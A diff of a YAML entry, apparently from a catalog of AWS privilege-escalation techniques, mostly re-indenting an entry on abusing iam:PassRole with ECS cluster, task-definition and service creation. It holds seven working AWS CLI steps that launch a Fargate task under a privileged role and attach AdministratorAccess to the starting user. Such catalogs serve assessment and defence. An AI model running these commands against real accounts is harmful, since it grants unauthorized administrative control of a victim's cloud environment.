@@ -1,103 +1,106 @@
 id: ecs-001
+parent:
+  id: ecs-003
+  modification: Adds ecs:CreateCluster permission for scenarios where no ECS cluster exists
 name: iam:PassRole + ecs:CreateCluster + ecs:RegisterTaskDefinition + ecs:CreateService
 category: new-passrole
 services:
-  - iam
-  - ecs
+- iam
+- ecs
 
 permissions:
   required:
-    - permission: iam:PassRole
-      resourceConstraints: Must have permission to pass a role to ecs-tasks.amazonaws.com
-    - permission: ecs:CreateCluster
-      resourceConstraints: Must be able to create ECS clusters
-    - permission: ecs:RegisterTaskDefinition
-      resourceConstraints: Must be able to register task definitions
-    - permission: ecs:CreateService
-      resourceConstraints: Must be able to create ECS services
+  - permission: iam:PassRole
+    resourceConstraints: Must have permission to pass a role to ecs-tasks.amazonaws.com
+  - permission: ecs:CreateCluster
+    resourceConstraints: Must be able to create ECS clusters
+  - permission: ecs:RegisterTaskDefinition
+    resourceConstraints: Must be able to register task definitions
+  - permission: ecs:CreateService
+    resourceConstraints: Must be able to create ECS services
   additional:
-    - permission: ec2:DescribeVpcs
-      resourceConstraints: Helpful for finding the default VPC for Fargate network configuration
-    - permission: ec2:DescribeSubnets
-      resourceConstraints: Helpful for finding subnets for Fargate network configuration
-    - permission: ecs:DescribeServices
-      resourceConstraints: Useful for monitoring service status during exploitation
-    - permission: ecs:DescribeTasks
-      resourceConstraints: Useful for monitoring task status during exploitation
-    - permission: ecs:ListTasks
-      resourceConstraints: Useful for listing tasks during exploitation
-    - permission: iam:ListRoles
-      resourceConstraints: Helpful for discovering available privileged roles to pass
-    - permission: iam:GetRole
-      resourceConstraints: Useful for viewing role permissions and trust policies
+  - permission: ec2:DescribeVpcs
+    resourceConstraints: Helpful for finding the default VPC for Fargate network configuration
+  - permission: ec2:DescribeSubnets
+    resourceConstraints: Helpful for finding subnets for Fargate network configuration
+  - permission: ecs:DescribeServices
+    resourceConstraints: Useful for monitoring service status during exploitation
+  - permission: ecs:DescribeTasks
+    resourceConstraints: Useful for monitoring task status during exploitation
+  - permission: ecs:ListTasks
+    resourceConstraints: Useful for listing tasks during exploitation
+  - permission: iam:ListRoles
+    resourceConstraints: Helpful for discovering available privileged roles to pass
+  - permission: iam:GetRole
+    resourceConstraints: Useful for viewing role permissions and trust policies
 
 description: A principal with `iam:PassRole`, `ecs:CreateCluster`, `ecs:RegisterTaskDefinition`, and `ecs:CreateService` can escalate privileges by creating a new ECS cluster, registering a task definition with a privileged IAM role, and launching the task via an ECS service. The task runs with the permissions of the passed role and can execute arbitrary code using the AWS CLI or SDK to modify the starting principal's permissions. This path is particularly useful because it works with Fargate launch type, eliminating the need for EC2 instance management, and the task automatically receives temporary credentials for the passed role.
 
 prerequisites:
   admin:
-    - A role must exist that trusts ecs-tasks.amazonaws.com service principal
-    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+  - A role must exist that trusts ecs-tasks.amazonaws.com service principal
+  - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
   lateral:
-    - A role must exist that trusts ecs-tasks.amazonaws.com service principal
+  - A role must exist that trusts ecs-tasks.amazonaws.com service principal
 
 exploitationSteps:
   awscli:
-    - step: 1
-      command: |
-        aws sts get-caller-identity
-      description: Get the AWS account ID needed for constructing role ARNs
-    - step: 2
-      command: |
-        aws ecs create-cluster --cluster-name privesc-cluster
-      description: Create a new ECS cluster to host the privileged task
-    - step: 3
-      command: |
-        aws ec2 describe-vpcs --filters "Name=isDefault,Values=true" --query "Vpcs[0].VpcId" --output text
-        aws ec2 describe-subnets --filters "Name=vpc-id,Values=<VPC_ID>" --query "Subnets[*].SubnetId" --output text
-      description: Retrieve the default VPC and subnet IDs required for Fargate network configuration
-    - step: 4
-      command: |
-        aws ecs register-task-definition \
-          --family privesc-task \
-          --network-mode awsvpc \
-          --requires-compatibilities FARGATE \
-          --cpu 256 \
-          --memory 512 \
-          --task-role-arn "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE" \
-          --execution-role-arn "arn:aws:iam::ACCOUNT_ID:role/ecsTaskExecutionRole" \
-          --container-definitions '[
-            {
-              "name": "privesc-container",
-              "image": "amazon/aws-cli",
-              "essential": true,
-              "command": [
-                "iam", "attach-user-policy",
-                "--user-name", "STARTING_USERNAME",
-                "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"
-              ]
-            }
-          ]'
-      description: Register a task definition that passes the privileged role and configures a container to execute AWS CLI commands for privilege escalation (e.g., attaching AdministratorAccess policy to the starting user)
-    - step: 5
-      command: |
-        aws ecs create-service \
-          --cluster privesc-cluster \
-          --service-name privesc-service \
-          --task-definition privesc-task \
-          --desired-count 1 \
-          --launch-type FARGATE \
-          --network-configuration "awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}"
-      description: Create an ECS service to launch the task. The service will start the task with the privileged role, and the container will execute the escalation command
-    - step: 6
-      command: |
-        aws ecs list-tasks --cluster privesc-cluster --service-name privesc-service
-        aws ecs describe-tasks --cluster privesc-cluster --tasks <TASK_ARN>
-      description: Monitor the task status and wait for it to reach STOPPED status, indicating the escalation commands have completed
-    - step: 7
-      command: |
-        aws sts get-caller-identity
-        aws iam list-attached-user-policies --user-name STARTING_USERNAME
-      description: Verify that the privilege escalation succeeded by checking if AdministratorAccess policy was attached to the starting user
+  - step: 1
+    command: |
+      aws sts get-caller-identity
+    description: Get the AWS account ID needed for constructing role ARNs
+  - step: 2
+    command: |
+      aws ecs create-cluster --cluster-name privesc-cluster
+    description: Create a new ECS cluster to host the privileged task
+  - step: 3
+    command: |
+      aws ec2 describe-vpcs --filters "Name=isDefault,Values=true" --query "Vpcs[0].VpcId" --output text
+      aws ec2 describe-subnets --filters "Name=vpc-id,Values=<VPC_ID>" --query "Subnets[*].SubnetId" --output text
+    description: Retrieve the default VPC and subnet IDs required for Fargate network configuration
+  - step: 4
+    command: |
+      aws ecs register-task-definition \
+        --family privesc-task \
+        --network-mode awsvpc \
+        --requires-compatibilities FARGATE \
+        --cpu 256 \
+        --memory 512 \
+        --task-role-arn "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE" \
+        --execution-role-arn "arn:aws:iam::ACCOUNT_ID:role/ecsTaskExecutionRole" \
+        --container-definitions '[
+          {
+            "name": "privesc-container",
+            "image": "amazon/aws-cli",
+            "essential": true,
+            "command": [
+              "iam", "attach-user-policy",
+              "--user-name", "STARTING_USERNAME",
+              "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"
+            ]
+          }
+        ]'
+    description: Register a task definition that passes the privileged role and configures a container to execute AWS CLI commands for privilege escalation (e.g., attaching AdministratorAccess policy to the starting user)
+  - step: 5
+    command: |
+      aws ecs create-service \
+        --cluster privesc-cluster \
+        --service-name privesc-service \
+        --task-definition privesc-task \
+        --desired-count 1 \
+        --launch-type FARGATE \
+        --network-configuration "awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}"
+    description: Create an ECS service to launch the task. The service will start the task with the privileged role, and the container will execute the escalation command
+  - step: 6
+    command: |
+      aws ecs list-tasks --cluster privesc-cluster --service-name privesc-service
+      aws ecs describe-tasks --cluster privesc-cluster --tasks <TASK_ARN>
+    description: Monitor the task status and wait for it to reach STOPPED status, indicating the escalation commands have completed
+  - step: 7
+    command: |
+      aws sts get-caller-identity
+      aws iam list-attached-user-policies --user-name STARTING_USERNAME
+    description: Verify that the privilege escalation succeeded by checking if AdministratorAccess policy was attached to the starting user
 limitations: |
   This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or access to sensitive data.
 
